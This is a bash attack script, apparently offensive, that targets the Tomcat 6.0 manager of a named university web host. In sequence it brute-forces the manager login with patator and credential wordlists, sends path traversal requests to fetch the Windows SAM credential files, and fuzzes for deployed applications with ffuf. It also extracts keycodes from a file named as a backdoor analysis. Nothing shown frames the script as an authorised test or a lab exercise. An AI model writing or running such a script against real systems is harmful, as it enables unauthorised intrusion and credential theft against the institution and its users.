#!/bin/bash
echo "[+] ULTIMATE TOMCAT 6.0 + WINDOWS XP ATTACK"

# 1. Analizar keycodes del backdoor
echo "[+] Analyzing backdoor keycodes..."
grep -B2 -A2 "var key" backdoor_analysis.js | grep -oE "keyCode.*[0-9]+" | cut -d: -f2 | sort -u > detected_keycodes.txt
echo "Keycodes detectados: $(cat detected_keycodes.txt | tr '\n' ' ')"

# 2. Fuerza bruta con credenciales de Windows XP
echo "[+] Windows XP credentials brute force..."
patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=winxp_users.txt 1=winxp_pass.txt -t 1 -x ignore:code=401

# 3. Fuerza bruta con variantes de tomcat
echo "[+] Tomcat variants brute force..."
patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=tomcat6_users.txt 1=tomcat_variants.txt -x ignore:code=401

# 4. Probar vulnerabilidades específicas de Tomcat 6.0
echo "[+] Testing Tomcat 6.0 specific vulnerabilities..."
curl -k "https://sito.utslp.edu.mx/..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM" -I
curl -k "https://sito.utslp.edu.mx/..\\..\\..\\..\\..\\..\\..\\..\\windows\\repair\\sam" -I

# 5. Buscar aplicaciones desplegadas
echo "[+] Searching for deployed applications..."
ffuf -u "https://sito.utslp.edu.mx/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -mc 200 -o deployed_apps.txt

echo "[+] ULTIMATE ATTACK COMPLETED"
